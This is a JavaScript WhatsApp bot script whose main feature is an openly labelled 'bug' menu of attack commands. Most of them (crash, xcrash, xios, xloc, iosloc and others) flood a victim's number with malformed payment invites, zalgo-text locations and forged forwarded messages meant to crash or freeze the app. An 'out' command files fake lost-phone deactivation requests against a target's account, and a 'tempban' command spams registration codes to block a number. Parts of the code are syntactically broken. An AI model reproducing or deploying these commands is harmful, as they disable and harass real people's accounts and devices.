require('./config')
const { exec, spawn, execSync } = require("child_process")
const fs = require('fs')
const fsx = require('fs-extra')
const util = require('util')
const fetch = require('node-fetch')
const axios = require('axios')
const cheerio = require('cheerio')
const { performance } = require("perf_hooks");
const { TelegraPH } = require("./lib/TelegraPH")
const { remini, jarak, ssweb, tiktok, PlayStore, BukaLapak, pinterest, stickersearch, lirik } = require("./lib/scraper")
const process = require('process');
const moment = require("moment-timezone")
const os = require('os');
const checkDiskSpace = require('check-disk-space').default;
const speed = require('performance-now')
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const { bytesToSize, checkBandwidth, formatSize, getBuffer, isUrl, jsonformat, nganuin, sleep, pickRandom, runtime, shorturl, formatp, color, getGroupAdmins } = require("./lib/myfunc");
const { addExif } = require('./lib/exif')


module.exports = xartva = async (xartva, m, chatUpdate, store) => {
try {
const body = (m && m?.mtype) ? (
m?.mtype === 'conversation' ? m?.message?.conversation :
m?.mtype === 'imageMessage' ? m?.message?.imageMessage?.caption :
m?.mtype === 'videoMessage' ? m?.message?.videoMessage?.caption :
m?.mtype === 'extendedTextMessage' ? m?.message?.extendedTextMessage?.text :
m?.mtype === 'buttonsResponseMessage' ? m?.message?.buttonsResponseMessage?.selectedButtonId :
m?.mtype === 'listResponseMessage' ? m?.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
m?.mtype === 'templateButtonReplyMessage' ? m?.message?.templateButtonReplyMessage?.selectedId :
m?.mtype === 'messageContextInfo' ? (
m?.message?.buttonsResponseMessage?.selectedButtonId || 
m?.message?.listResponseMessage?.singleSelectReply?.selectedRowId || 
m?.text
) : ''
) : '';
const budy = (m && typeof m?.text === 'string') ? m?.text : '';
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1);
const full_args = body.replace(command, '').slice(1).trim();
const pushname = m?.pushName || "No Name";
const botNumber = await xartva.decodeJid(xartva.user.id);
const isCreator = (m && m?.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m?.sender)) || false;
const itsMe = (m && m?.sender && m?.sender == botNumber) || false;
const text = q = args.join(" ");
const fatkuns = m && (m?.quoted || m);
const quoted = (fatkuns?.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] :
(fatkuns?.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
(fatkuns?.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] :
m?.quoted || m;
const mime = ((quoted?.msg || quoted) || {}).mimetype || '';
const qmsg = (quoted?.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
//group
const groupMetadata = m?.isGroup ? await xartva.groupMetadata(m?.chat).catch(e => {}) : {};
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const participants = m?.isGroup ? await groupMetadata.participants || [] : [];
const groupAdmins = m?.isGroup ? await getGroupAdmins(participants) || [] : [];
const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m?.isGroup ? groupAdmins.includes(m?.sender) : false;
const groupOwner = m?.isGroup ? groupMetadata.owner || '' : '';
const isGroupOwner = m?.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m?.sender) : false;

//================== [ BUGS ] ==================//
const { xtext } = require('./99/xtext')
const { xiphone } = require('./99/xiphone')
//================== [ TIME ] ==================//
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'SELAMAT MALAM'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'SELAMAT PETANG'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'SELAMAT SORE'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'SELAMAT SIANG'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = 'SELAMAT PAGI'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'SUBUH OYY'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = 'JAM SEGINI BELUM TIDUR??'
        }

//================== [ DATABASE ] ==================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let user = global.db.data.users[m?.sender]
if (typeof user !== 'object') global.db.data.users[m?.sender] = {}
if (user) {
} else global.db.data.users[m?.sender] = {
}

 let chats = global.db.data.chats[m?.chat]
 if (typeof chats !== 'object') global.db.data.chats[m?.chat] = {}
 if (chats) {
 if (!('isBanned' in chat)) chat.isBanned = false
 } else global.db.data.chats[m?.chat] = {
 isBanned: false,
}

let setting = global.db.data.settings[botNumber]
if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
if (setting) {
 if (!('autoread' in setting)) setting.autoread = false
if (!("public" in settings)) settings.public = true
} else global.db.data.settings[botNumber] = {
 autoread: false,
 public: true,
}
} catch (err) {
}

//=================================================//
async function loading() {
  var load = [
    `> Hello King⚡🗿!`,
    `> ℭ𝔞𝔩𝔩 𝔐𝔢 𝔛𝔞𝔯𝔱𝔳𝔞 𝔅𝔬𝔱🤫🧏`,
    `> 乃ㄚ ㄖ乙乙ㄚᗪ乇ᐯ🦖`,
    '> 𝖃𝖆𝖗𝖙𝖛𝖆 𝖗𝖊𝖆𝖉𝖞😄'
  ]
  var xtr = `> 𝖃𝖆𝖗𝖙𝖛𝖆 𝖉𝖎𝖒𝖚𝖑𝖆𝖎😴`
  let { key } = await xartva.sendMessage(m?.chat,{text:xtr})
  for (let i = 0; i < load.length; i++) {
    await xartva.sendMessage(m?.chat, {text:load[i], edit:key})
  }
}

async function bugloading() {
  var ozzyload = [
    `> Hello King⚡🗿`,
    `> 𝖂𝖆𝖎𝖙𝖎𝖓𝖌 𝖋𝖔𝖗 𝖇𝖚𝖌 𝖘𝖚𝖇𝖒𝖎𝖘𝖘𝖎𝖔𝖓☠️`,
    `《 █▒▒▒▒▒▒▒▒▒▒▒》10%`,
    `《 ████▒▒▒▒▒▒▒▒》30%`,
    `《 ███████▒▒▒▒▒》50%`,
    `《 ██████████▒▒》80%`,
    `《 ████████████》100%`,
    `> 𝕷𝖔𝖆𝖉𝖎𝖓𝖌 𝕮𝖔𝖒𝖕𝖑𝖊𝖙𝖊☠️⚡`
  ]
  var ozzynz = `> ℭ𝔞𝔩𝔩 𝔐𝔢 𝔛𝔞𝔯𝔱𝔳𝔞 𝔅𝔬𝔱🤫🧏`
  let { key } = await xartva.sendMessage(m?.chat, {text:ozzynz})
  for (let i = 0; i < ozzyload.length; i++) {
    await xartva.sendMessage(m?.chat, {text:ozzyload[i], edit:key})
  }
}

const xbug = {
  key: {
    remoteJid: 'status@broadcast',
    fromMe: false, 
    participants: '0@s.whatsapp.net'
  },
  message: {
    listResponseMessage: {
      title: botname
    }
  }
}

async function xreply(teks) {
  const wwk = {
    contextInfo: {
      forwardingScore: 99999999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterName: "օʐʐʏɖɛʋ ֆƈ☠️🗿",
        newsletterJid: "12036331944147954@newsletter",
      },
      externalAdReply: {
        showAdAttribution: true,
        title: "օʐʐʏɖɛʋ ֆƈ☠️🗿",
        body: "☠️",
        thumbnailUrl: thumb,
        sourceUrl: "https://t.me/lrzozz",
      },
    },
    text: teks
  }
  xartva.sendMessage(m?.chat, wwk, {
    quoted: m
  })
}
//=================================================//
switch(command) {
//=================================================//
case "menu":{
await loading()
const tek = `
┏━━━━━━━━━━━━━━━━━
┃ Xartva BOT INFO
┏━━━━━━━━━━━━━━━━━
┃ ♙ *Bot Name :* ${botname}
┃ ☏ *Creator :* OzzyDev
┃ Ⓡ *Runtime :* ${runtime(process.uptime())}
┃ ♗ *Version :* 999999
┗━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━
┃ Xartva USER INFO
┏━━━━━━━━━━━━━━━━━
┃ ♙ *Name :* ${pushname}
┃ ☏ *Number :* ${m?.sender.split('@')[0]}
┃ ♗ *Status* : ${isCreator ? "Owner" : "User"}
┗━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━
┃ Xartva BOT Menu
┏━━━━━━━━━━━━━━━━━
┃ ❒ .ownermenu
┃ ❒ .xartvabug
┃ ❒ .stickermenu
┃ ❒ .toolsmenu
┃ ❒ .groupmenu
┗━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━
┃ DISCLAMER⚠️❗
┏━━━━━━━━━━━━━━━━━
┃ ❒ The developer is not responsible for any misuse of the bot❗
┃ ❒ Use at your own risk❗⚠️
┗━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━
┃ Social Media
┏━━━━━━━━━━━━━━━━━
┃ ❒ Telegram: https://t.me/lrozz
┃ ❒ Github: https://github.com/lrzozz256
┗━━━━━━━━━━━━━━━━━
`
xartva.sendMessage(m?.chat, {
  image: {
    url: "https://l.top4top.io/p_3265i2jbk9.jpg"
  },
  caption: tek
}, { quoted: m })
}
break
//=================================================//
case "ownermenu":{
await loading()
const owteks = `
┏━━━━━━━━━━━━━━━━━
┃ Xartva BOT INFO
┏━━━━━━━━━━━━━━━━━
┃ ♙ *Bot Name :* ${botname}
┃ ☏ *Creator :* OzzyDev
┃ Ⓡ *Runtime :* ${runtime(process.uptime())}
┃ ♗ *Version :* 999999
┗━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━
┃ Xartva USER INFO
┏━━━━━━━━━━━━━━━━━
┃ ♙ *Name :* ${pushname}
┃ ☏ *Number :* ${m?.sender.split('@')[0]}
┃ ♗ *Status* : ${isCreator ? "Owner" : "User"}
┗━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━
┃ Xartva OWNER Menu
┏━━━━━━━━━━━━━━━━━
┃ ❒ .disk
┃ ❒ .ping
┃ ❒ .stop
┃ ❒ $
┃ ❒ =>
┃ ❒ >
┗━━━━━━━━━━━━━━━━━
`
xartva.sendMessage(m?.chat, {
  image: {
    url: "https://l.top4top.io/p_3265i2jbk9.jpg"
  },
  caption: owteks
}, { quoted: m })
}
break
//=================================================//
case "xartvabug":{
await loading()
const bteks = `
┏━━━━━━━━━━━━━━━━━
┃ Xartva BOT INFO
┏━━━━━━━━━━━━━━━━━
┃ ♙ *Bot Name :* ${botname}
┃ ☏ *Creator :* OzzyDev
┃ Ⓡ *Runtime :* ${runtime(process.uptime())}
┃ ♗ *Version :* 999999
┗━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━
┃ Xartva USER INFO
┏━━━━━━━━━━━━━━━━━
┃ ♙ *Name :* ${pushname}
┃ ☏ *Number :* ${m?.sender.split('@')[0]}
┃ ♗ *Status* : ${isCreator ? "Owner" : "User"}
┗━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━
┃ Xartva BUG Menu
┏━━━━━━━━━━━━━━━━━
┃ *CRASH WHATSAPP*
┏━━━━━━━━━━━━━━━━━
┃ ❒ .crash
┃ ❒ .oke
┃ ❒ .xcrash
┃ ❒ .xloc
┗━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━
┃ *IOS CRASH*
┏━━━━━━━━━━━━━━━━━
┃ ❒ .xios
┃ ❒ .iosgoogle
┃ ❒ .ios
┃ ❒ .iosloc
┗━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━
┃ *UI CRASH*
┏━━━━━━━━━━━━━━━━━
┃ ❒ .trashui
┃ ❒ .stuck
┃ ❒ .blank
┃ ❒ .loctrashui
┗━━━━━━━━━━━━━━━━━
`
xartva.sendMessage(m?.chat, {
  image: {
    url: "https://l.top4top.io/p_3265i2jbk9.jpg"
  },
  caption: bteks
}, { quoted: m })
}
break
//=================================================//
case "disk":{
await loading()
exec('cd && du -h --max-depth=1', (err, stdout) => {
if (err) return xreply(`${err}`)
if (stdout) return xreply(stdout)
})
}
break
//=================================================//
case "stop":{
await loading()
xreply(`> Bye`)
process.exit()
}
break
//=================================================//
case "tempban":{
if(!text) return xreply("Contoh: .tempban 62857xxxxxxxxx")
await loading()
let { default: makeWaSocket, useMultiFileAuthState } = require("@adiwajshing/baileys")
let number = text.split("|")[0]
await xreply(`Success! Registration Interruption has been successfully activated to the target : ${fullNo} for an unlimited period of time. Registration interruption will be stopped if the server is restarted, shut down, or down.`)
let { state, saveCreds } = await useMultiFileAuthState('session')
let spam = makeWaSocket({
auth: state,
browser: ["Ubuntu", "Chrome", "20.0.04"]
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode(number)
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}
}
break
//=================================================//
case "out":{
if (!text) return xreply(`${prefix + command}62857xxxxxxx`)
await loading()
let xno = `+`+text.split("|")[0].replace(/[^0-9]/g, '')
let xwa = await xartva.onWhatsapp(xno)
if (xwa.length == 0) return xreply('Masukkin no yg udah di loginin ke wa!')
let xlinkwa = await axios.get("https://www.whatsapp.com/contact/noclient/")
let xlinkemail = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xlinkwa.headers["set-cookie"].join("; ")
let $ = cheerio.load(xlinkwa.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xno)
form.append("email", xlinkemail.data[0])
form.append("email_confirm", xlinkemail.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
await xartva.sendMessage(m?.chat, {
  text: util.format(res.data)
}, { quoted: m })
}
break
//=================================================//
case "add":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) xreply('masukkan nomor yang ingin di tambahkan')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xartva.groupParticipantsUpdate(m?.chat, [users], 'add').catch(console.log)
}
break
//=================================================//
case "kick":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) xreply('masukkan nomor yang ingin di kick')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xartva.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
}
break
//=================================================//
case "promote":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) xreply('masukkan nomor yang ingin di promote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xartva.groupParticipantsUpdate(m?.chat, [users], 'promote').catch(console.log)
}
break
//=================================================//
case "demote":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) xreply('masukkan nomor yang ingin di demote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xartva.groupParticipantsUpdate(m?.chat, [users], 'demote').catch(console.log)
}
break
//=================================================//
case "crash":{
if (!text) return xreply(`${prefix + command} 62857xxxxxxx`)
await bugloading()
await xreply(`> Sending BUG Use ${prefix + command}`)
let victim = text.split("|")[0]+"@s.whatsapp.net"
let amount = 20
for (let i = 0; i < amount; i++) {
  await xartva.sendMessage(victim, {
    text: xtext
    contextInfo: {
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: '12036331944147954@newsletter',
        newsletterName: xiphone,
        serverMessageId: 2
      }
    }
  }, { quoted: xbug })
  await xartva.sendMessage(victim, {
    text: xiphone,
    contextInfo: {
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: '12036331944147954@newsletter',
        newsletterName: xtext,
        serverMessageId: 143
      }
    }
  }, { quoted: xbug })
  await sleep(5000)
}
await xreply(`> Done! Sending BUG Use ${prefix + command}`)
}
break
//=================================================//
case "oke":{
if (!text) return xreply(`${prefix + command} 62857xxxxxxx`)
await bugloading()
await xreply(`> Sending BUG Use ${prefix + command}`)
let victim = text.split("|")[0]+"@s.whatsapp.net"
let amount = 20
for (let i = 0; i < amount; i++){
  await xartva.sendMessage(victim, {
    text: xiphone,
    contextInfo: {
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: '12036331944147954@newsletter',
        newsletterName: xtext,
        serverMessageId: 143
      }
    }
  }, { quoted: xbug })
  await xartva.relayMessage(victim, {
    paymentInviteMessage: {
      serviceType: "FBPAY",
      expiryTimestamp: Date.now() + 189999900000
    }
  }, {})
  await sleep(5000)
}
await xreply(`> Done! Sending BUG Use ${prefix + command}`)
}
break
//=================================================//
case "xcrash":{
if (!text) return xreply(`${prefix + command} 62857xxxxxxx`)
await bugloading()
await xreply(`> Sending BUG Use ${prefix + command}`)
let victim = text.split("|")[0]+"@s.whatsapp.net"
let amount = 25
for (let i = 0; i < amount; i++){
await xartva.sendMessage(victim, {
    text: xtext,
    contextInfo: {
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: '12036331944147954@newsletter',
        newsletterName: xiphone,
        serverMessageId: 143
      }
    }
  }, { quoted: xbug })
  await xartva.relayMessage(victim, {
    paymentInviteMessage: {
      serviceType: "FBPAY",
      expiryTimestamp: Date.now() + 189999900000
    }
  }, {})
  await xartva.sendMessage(victim, {
    text: xiphone,
    contextInfo: {
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: '12036331944147954@newsletter',
        newsletterName: xtext,
        serverMessageId: 143
      }
    }
  }, { quoted: xbug })
  await xartva.relayMessage(victim, {
    paymentInviteMessage: {
      serviceType: "FBPAY",
      expiryTimestamp: Date.now() + 189999900000
    }
  }, {})
  await sleep(6000)
}
await xreply(`> Done! Sending BUG Use ${prefix + command}`)
}
break
//=================================================//
//=================================================//
case "xios":{
if (!text) return xreply(`${prefix + command}62857xxxxxxx`)
await bugloading()
await xreply(`> Sending BUG Use ${prefix + command}`)
let victim = text.split("|")[0]+"@s.whatsapp.net"
let amount = 20
for (let i = 0; i < amount; i++) {
  await xartva.relayMessage(victim, {
    paymentInviteMessage: {
      serviceType: "FBPAY",
      expiryTimestamp: Date.now() + 189999900000
    }
  }, {})
  await xartva.sendMessage(victim, {
    text: xiphone,
    contextInfo: {
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterJid: '12036331944147954@newsletter',
      newsletterName: xiphone
      }
    }
  }, { quoted: xbug })
  await sleep(4000)
}
await xreply(`> Done! Sending BUG Use ${prefix + command}`)
}
break
//=================================================//
//=================================================//
case "xloc":{
if (!text) return xreply(`${prefix + command} 62857xxxxxxx`)
await bugloading()
await xreply(`> Sending BUG Use ${prefix + command}`)
let victim = text.split("|")[0]+"@s.whatsapp.net"
let amount = 12
let XOP = 'O̷̡̡̙̰̩̳̱̍̊̀͌̕͠z̷̡̧̯͕͍͈̼̪̦̞͎̜̘͕̭̄͛̋̽͒̉͜ͅz̴̛͓͓̪̩̮̓͐̂̏́́̕͘͝ÿ̸̧̛͎͓̠̗̩̖͉͍͚͙̬̃̿͒͂̈́̇̄͑̀͂͆͘̚͜ͅͅX̴͎̦̰͎̙̳̯̯̝̳̰̱͖̜̳̔̿͋̐̈́̎̂̓̔͜͜͝C̵̡̢̺͚̭̯̱̤̭̣͎̦̦̙͌̀͆ͅř̷͙̓͆̽̊̈́̎̓̈́͑͑̂̒̕̚͝ā̵̧̝͇͍͖̠̬̱̦̦̯̦̥̘̀̾̀̆̄̿̓̃͛̈́͠͠ͅś̶̲̠͔̥͔̥͇͎̋̽̚ͅḧ̸̠̪̱́̅̍̓̾͠Ẍ̶̧̡̛̺̘͎͕̯̺̥͎́̃̉͋̿̀̌̀̓̄̑͗̏͝x̷͕̱̦̖͔͌̄̾͋̈́̓̚͘'.repeat(5000)
for (let i = 0; i < amount; i++) {
  await xartva.sendMessage(victim, {
    location: {
      degreesLatitude: 999.999,
      degreesLongitude: -99.888,
      name: xtext,      
      address: 'O̷̡̡̙̰̩̳̱̍̊̀͌̕͠z̷̡̧̯͕͍͈̼̪̦̞͎̜̘͕̭̄͛̋̽͒̉͜ͅz̴̛͓͓̪̩̮̓͐̂̏́́̕͘͝ÿ̸̧̛͎͓̠̗̩̖͉͍͚͙̬̃̿͒͂̈́̇̄͑̀͂͆͘̚͜ͅͅX̴͎̦̰͎̙̳̯̯̝̳̰̱͖̜̳̔̿͋̐̈́̎̂̓̔͜͜͝C̵̡̢̺͚̭̯̱̤̭̣͎̦̦̙͌̀͆ͅř̷͙̓͆̽̊̈́̎̓̈́͑͑̂̒̕̚͝ā̵̧̝͇͍͖̠̬̱̦̦̯̦̥̘̀̾̀̆̄̿̓̃͛̈́͠͠ͅś̶̲̠͔̥͔̥͇͎̋̽̚ͅḧ̸̠̪̱́̅̍̓̾͠Ẍ̶̧̡̛̺̘͎͕̯̺̥͎́̃̉͋̿̀̌̀̓̄̑͗̏͝x̷͕̱̦̖͔͌̄̾͋̈́̓̚͘'
      url: `https://${XOP}.com`,
      commet: xiphone,      
      jpegThumbnail: null
    }
  }, { quoted: xbug })
  await xartva.relayMessage(victim, {
    extendedTextMessage: {
      text: xiphone,
      contextInfo: {
        stanzaId: victim,
        participants: victim,
        quotedMessage: {
          conversation: xtext        
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      },
      inviteLinkGroupTypeV2: true
    }
  }, { messageId: null })
  await sleep(5000)
}
await xreply(`> Done! Sending BUG Use ${prefix + command}`)
}
break
//=================================================//
case "ios":{
if (!text) return xreply(`${prefix + command} 62857xxxxxxx`)
await bugloading()
await xreply(`> Sending BUG Use ${prefix + command}`)
let victim = text.split("|")[0]+"@s.whatsapp.net"
let amount = 10
for (let i = 0; i < amount; i++) {
  await xartva.sendMessage(victim, {
    text: ''
  }, { quoted: xbug })
  await xartva.sendMessage(victim, {
    text: xtext
  }, { quoted: xbug })
  await xartva.relayMessage(victim, {
    extendedTextMessage: {
      text: xiphone,
      contextInfo: {
        stanzaId: victim,
        participants: victim,
        quotedMessage: {
          conversation: xtext        
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      },
      inviteLinkGroupTypeV2: true
    }
  }, { messageId: null })
  await sleep(4000)
}
await xreply(`> Done! Sending BUG Use ${prefix + command}`)
}
break
//=================================================//
case "iosgoogle":{
if (!text) return xreply(`${prefix + command}62857xxxxxxx`)
await bugloading()
await xreply(`> Sending BUG Use ${prefix + command}`)
let victim = text.split("|")[0]+"@s.whatsapp.net"
let amount = 15
for (let i = 0; i < amount; i++) {
  await xartva.sendMessage(victim, {
    text: 'https://www.google.com',
    contextInfo: {
      externalAdReply: {
        renderLargerThumbnail: true,
        mediaType: 1,
        title: xiphone,
        body: xiphone,    
        thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
        jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
        previewType: "NONE",
        sourceUrl: "https://wa.me/99999"
      }
    }
  })
  await xartva.relayMessage(victim, {
    extendedTextMessage: {
      text: xiphone,
      contextInfo: {
        stanzaId: victim,
        participants: victim,
        quotedMessage: {
          conversation: xtext        
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      },
      inviteLinkGroupTypeV2: true
    }
  }, { messageId: null })
  await xartva.relayMessage(victim, {
    extendedTextMessage: {
      text: xiphone,
      contextInfo: {
        stanzaId: victim,
        participants: victim,
        quotedMessage: {
          conversation: xtext        
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      },
      inviteLinkGroupTypeV2: true
    }
  }, { messageId: null })
  await sleep(7000)
}
await xreply(`> Done! Sending BUG Use ${prefix + command}`)
}
break
//=================================================//
case "iosloc":{
if (!text) return xreply(`${prefix + command} 62857xxxxxxx`)
await bugloading()
await xreply(`> Sending BUG Use ${prefix + command}`)
let victim = text.split("|")[0]+"@s.whatsapp.net"
let amount = 19
for (let i = 0; i < amount; i++) {
  await xartva.relayMessage(victim, {
    extendedTextMessage: {
      text: xiphone,
      contextInfo: {
        stanzaId: victim,
        participants: victim,
        quotedMessage: {
          conversation: xtext        
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      },
      inviteLinkGroupTypeV2: true
    }
  }, { messageId: null })
  await xartva.sendMessage(victim, {
    location: {
      degreesLatitude: 999.999,
      degreesLongitude: -99.888,
      name: xiphone,
      address: '☠̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̛̛̛̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̚͘̕͠͝͝͝